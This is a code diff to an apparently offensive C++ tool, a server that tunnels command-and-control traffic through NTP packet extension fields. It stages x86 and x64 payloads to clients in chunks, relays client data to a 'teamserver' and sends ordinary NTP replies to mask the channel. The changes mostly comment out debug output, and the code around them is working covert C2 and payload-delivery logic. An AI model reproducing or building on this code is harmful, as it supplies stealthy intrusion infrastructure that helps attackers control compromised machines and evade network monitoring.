@@ -49,7 +49,7 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
 
     // Extract client ID for session lookup
     std::vector<uint8_t> clientId = ntpPacket.getExtensionClientId();
-    std::cout << "[?] Client Session ID: ";
+    //std::cout << "[?] Client Session ID: ";
     printHexVector(clientId);
     std::cout << std::endl;
 
@@ -69,12 +69,10 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
             return;
         }
 
-        std::cout << "[?] Payload Arch = 0x"
-            << std::hex << static_cast<int>(payloadArch)
-            << std::dec << std::endl;
+        //std::cout << "[?] Payload Arch = 0x"<< std::hex << static_cast<int>(payloadArch)<< std::dec << std::endl;
 
         if (payloadArch == 0x86) {
-            std::cout << "[?] X86 Payload Requested" << std::endl;
+            //std::cout << "[?] X86 Payload Requested" << std::endl;
             uint32_t uintClientId = vectorToUint32(clientId);
             printClientIDs(sessions);
 
@@ -85,11 +83,10 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
                 std::vector<uint8_t> payload = getx86Payload(clientSocket);
                 it->second.setForClientBuffer(payload);
 
-                std::cout << "[?] Stored payload in client class, size: "
-                    << payload.size();
+                //std::cout << "[?] Stored payload in client class, size: "<< payload.size();
 
                 std::vector<uint8_t> sizeVector = uint32ToBytes(payload.size());
-                std::cout << "[?] DEBUG: Payload as vector: ";
+                //std::cout << "[?] DEBUG: Payload as vector: ";
                 printHexVector(sizeVector);
 
                 NTPPacket newPacketClass;
@@ -103,12 +100,12 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
                 return;
             }
             else {
-                std::cout << "[?] Could not find client class: ";
+                //std::cout << "[?] Could not find client class: ";
                 printHexVector(clientId);
             }
         }
         else if (payloadArch == 0x64) {
-            std::cout << "[?] X64 Payload Requested" << std::endl;
+            //std::cout << "[?] X64 Payload Requested" << std::endl;
             uint32_t uintClientId = vectorToUint32(clientId);
             printClientIDs(sessions);
 
@@ -119,11 +116,10 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
                 std::vector<uint8_t> payload = getx64Payload(clientSocket);
                 it->second.setForClientBuffer(payload);
 
-                std::cout << "[?] Stored payload in client class, size: "
-                    << payload.size();
+                //std::cout << "[?] Stored payload in client class, size: "<< payload.size();
 
                 std::vector<uint8_t> sizeVector = uint32ToBytes(payload.size());
-                std::cout << "[?] DEBUG: Payload as vector: ";
+                //std::cout << "[?] DEBUG: Payload as vector: ";
                 printHexVector(sizeVector);
 
                 NTPPacket newPacketClass;
@@ -137,20 +133,19 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
                 return;
             }
             else {
-                std::cout << "[?] Could not find client class: ";
+                //std::cout << "[?] Could not find client class: ";
                 printHexVector(clientId);
             }
         }
         else if (payloadArch == 0x00) {
-            std::cout << "[?] 0x00 continuation of getting payload" << std::endl;
+            //std::cout << "[?] 0x00 continuation of getting payload" << std::endl;
 
             uint32_t convertedClientId = vectorToUint32(clientId);
-            std::cout << "[?] Looking up class by key: "
-                << convertedClientId << std::endl;
+            //std::cout << "[?] Looking up class by key: "<< convertedClientId << std::endl;
 
             auto it = sessions.find(convertedClientId);
             if (it != sessions.end()) {
-                std::cout << "[?] Class exists for " << convertedClientId << std::endl;
+                //std::cout << "[?] Class exists for " << convertedClientId << std::endl;
                 std::vector<uint8_t> nextChunk = it->second.getNextChunk(Chunk::maxChunkSize);
 
                 NTPPacket responsePacketClass;
@@ -163,11 +158,11 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
                 sendNtpPacket(client_addr, sock, responsePacketClass.getPacket());
             }
             else {
-                std::cout << "[?] Client Class not found!" << std::endl;
+                //std::cout << "[?] Client Class not found!" << std::endl;
             }
         }
         else {
-            std::cout << "[?] Invalid Payload" << std::endl;
+            //std::cout << "[?] Invalid Payload" << std::endl;
         }
     }
 
@@ -179,14 +174,13 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
         printHexVectorPacket(ntpPacket.getRawPacket());
 
         uint32_t clientID = generateClientID();
-        std::cout << "[?] Client ID: " << clientID << std::endl;
+        //std::cout << "[?] Client ID: " << clientID << std::endl;
 
         std::vector<uint8_t> clientIdVector = uint32ToBytes(clientID);
         ClientSession someClient(clientIdVector);
 
         sessions.insert({ clientID, someClient });
-        std::cout << "[?] Added Client Session with ID: "
-            << clientID << " to sessions map." << std::endl;
+        //std::cout << "[?] Added Client Session with ID: " << clientID << " to sessions map." << std::endl;
 
         NTPPacket idPacket;
         idPacket.addExtensionField(
@@ -206,14 +200,13 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
         printHexVectorPacket(ntpPacket.getRawPacket());
 
         uint32_t uintClientId = vectorToUint32(clientId);
-        std::cout << "[?] Looking up client ID: " << uintClientId << std::endl;
+        //std::cout << "[?] Looking up client ID: " << uintClientId << std::endl;
         auto it = sessions.find(uintClientId);
         if (it != sessions.end()) {
             uint32_t uintMessageSize = vectorToUint32(ntpPacket.getExtensionData());
             it->second.setFromClientBufferSize(uintMessageSize);
 
-            std::cout << "[?] Stored message size in client class, size: "
-                << it->second.getFromClientBufferSize() << std::endl;
+            //std::cout << "[?] Stored message size in client class, size: " << it->second.getFromClientBufferSize() << std::endl;
 
             NTPPacket newPacketClass;
             newPacketClass.addExtensionField(
@@ -226,7 +219,7 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
             return;
         }
         else {
-            std::cout << "[?] Could not find client class: ";
+            //std::cout << "[?] Could not find client class: ";
             printHexVector(clientId);
         }
     }
@@ -257,11 +250,11 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
                 std::cout << "[+] Data from client complete, sending to teamserver" << std::endl;
 
                 
-                std::cout << "Forwarding data to TS" << std::endl;
+                std::cout << "[+] Forwarding data to TS" << std::endl;
                 std::vector<uint8_t> frame =
                     forwardToTeamserver(it->second.fromClientBuffer, it->second.getSocket());
 
-                std::cout << "setForClientBuffer" << std::endl;
+                //std::cout << "setForClientBuffer" << std::endl;
                 it->second.setForClientBuffer(frame);
                 std::cout << "[+] TS comms complete" << std::endl;
 
@@ -293,7 +286,7 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
             }
         }
         else {
-            std::cout << "[?] Could not find client class: ";
+            //std::cout << "[?] Could not find client class: ";
             printHexVector(clientId);
         }
     }
@@ -310,10 +303,8 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
         if (it != sessions.end()) {
             std::vector<uint8_t> chunkForClient = it->second.getNextChunk(Chunk::maxChunkSize);
 
-            std::cout << "[?] Size of total stored data: "
-                << it->second.getForClientBuffer().size() << std::endl;
-            std::cout << "[?] Size of chunk to send: "
-                << chunkForClient.size() << std::endl;
+            //std::cout << "[?] Size of total stored data: " << it->second.getForClientBuffer().size() << std::endl;
+            //std::cout << "[?] Size of chunk to send: " << chunkForClient.size() << std::endl;
 
             NTPPacket newPacketClass;
             newPacketClass.addExtensionField(
@@ -325,7 +316,7 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
             sendNtpPacket(client_addr, sock, newPacketClass.getPacket());
         }
         else {
-            std::cout << "[?] Could not find client class: ";
+            //std::cout << "[?] Could not find client class: ";
             printHexVector(clientId);
             sendNormalNtpPacket(client_addr, sock);
         }
@@ -354,7 +345,7 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
             sendNtpPacket(client_addr, sock, newPacketClass.getPacket());
         }
         else {
-            std::cout << "[?] Could not find client class: ";
+            //std::cout << "[?] Could not find client class: ";
             printHexVector(clientId);
             sendNormalNtpPacket(client_addr, sock);
         }
@@ -365,7 +356,7 @@ void handle_ntp_packet(char* data, int len, sockaddr_in* client_addr, SOCKET soc
         std::cout << "----------------------" << std::endl;
         std::cout << "PCKT: Unknown" << std::endl;
         std::cout << "----------------------" << std::endl;
-        std::cout << "[?] Packet extension did not match known extensions" << std::endl;
+        //std::cout << "[?] Packet extension did not match known extensions" << std::endl;
         printHexVectorPacket(ntpPacket.getRawPacket());
         sendNormalNtpPacket(client_addr, sock);
     }
